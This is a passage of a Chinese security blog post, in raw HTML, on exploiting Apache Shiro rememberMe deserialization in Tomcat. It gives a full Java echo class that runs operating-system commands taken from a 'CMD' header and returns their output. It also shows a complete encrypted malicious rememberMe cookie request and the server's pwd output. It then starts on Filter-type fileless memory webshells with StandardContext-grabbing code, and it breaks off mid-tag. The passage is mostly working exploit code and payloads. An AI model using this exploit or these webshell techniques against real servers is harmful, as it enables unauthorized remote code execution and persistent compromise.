class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeBody</span><span class="params">(Object obj, <span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bs = (<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(bytes)).getBytes();</span><br><span class="line">        Object object;</span><br><span class="line">        Class cls;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cls = Class.forName(<span class="string">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);</span><br><span class="line">            object = cls.newInstance();</span><br><span class="line">            cls.getDeclaredMethod(<span class="string">&quot;setBytes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;).invoke(object, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs, <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Integer</span>(bs.length)&#125;);</span><br><span class="line">            obj.getClass().getMethod(<span class="string">&quot;doWrite&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;cls&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            cls = Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class="line">            object = cls.getDeclaredMethod(<span class="string">&quot;wrap&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(cls, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            obj.getClass().getMethod(<span class="string">&quot;doWrite&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;cls&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String field)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cls != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                f = cls.getDeclaredField(field);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                cls = cls.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(field);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> f.get(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TomcatEcho</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; threads.length; ++i) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> threads[i];</span><br><span class="line">            <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> getFieldValue(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            obj = getFieldValue(getFieldValue(getFieldValue(obj, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        java.util.<span class="type">List</span> <span class="variable">processors</span> <span class="operator">=</span> (java.util.List) getFieldValue(obj,<span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>; n &lt; processors.size(); ++n) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">processor</span> <span class="operator">=</span> processors.get(n);</span><br><span class="line">                            obj = getFieldValue(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> obj.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> (String) obj.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Host&quot;</span>)&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (host != <span class="literal">null</span> &amp;&amp; !host.isEmpty()) &#123;</span><br><span class="line">                                resp.getClass().getMethod(<span class="string">&quot;setStatus&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Integer.TYPE&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">200</span>)&#125;);</span><br><span class="line">                                flag = <span class="literal">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String) obj.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;CMD&quot;</span>)&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                                String[] cmds = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                                writeBody(resp, (<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner((<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds)).start().getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes());</span><br><span class="line">                                flag = <span class="literal">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将如上类配合CB1链并进行AES加密，生成恶意的Shiro rememberMe Cookie，然后发送HTTP请求，结果如下，成功执行pwd命令。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.100:8089</span><br><span class="line"><span class="attribute">CMD</span><span class="punctuation">: </span>pwd</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=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</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 22 May 2023 11:17:49 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"></span><br><span class="line"><span class="language-awk"><span class="regexp">/opt/</span>apache-tomcat<span class="regexp">/apache-tomcat-7.0.0/</span>bin</span></span><br></pre></td></tr></table></figure><h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><p>以上实现的命令执行回显输出还只是开胃小菜，它每次执行命令都需要携带很长的一串Payload。接下来进入正餐时刻，内存马，一次注入，随处使用。</p><p>在我的前一篇文章<a href="https://0xf4n9x.github.io/tomcat-filter-memshell.html">《Tomcat Filter型内存马》</a>中已经提到了关于Filter型内存马的基础知识，不过在那篇文章中，攻击的手法是通过上传一个JSP Webshell文件，访问执行才达到内存马的注入，在那种情况下，是无需关心Request对象的获取的。但这也背离了内存马无文件落地的初衷。</p><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p>在注入内存马前的一个关键就是获取StandardContext对象，StandardContext是org.apache.catalina.Context接口的一个实现类，代表了一个具体的Web应用上下文，并管理着应用的配置、生命周期和组件（如Servlet和Filter）。</p><p>在前文中获取StandardContext的方式如下，其中ServletContext是一个标准的Servlet API接口，提供了与Web应用交互的方法。ApplicationContext则是ServletContext的一个实现类，可以直接从ServletContext中获取context字段，该字段指向了ApplicationContext对象，同时在ApplicationContext中也包含一个context字段指向StandardContext。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">contextField = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.catalina.core.<span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br></pre></td></tr></table></figure><h3 id="Request对象的转换"><a href="#Request对象的转换" class="headerlink" 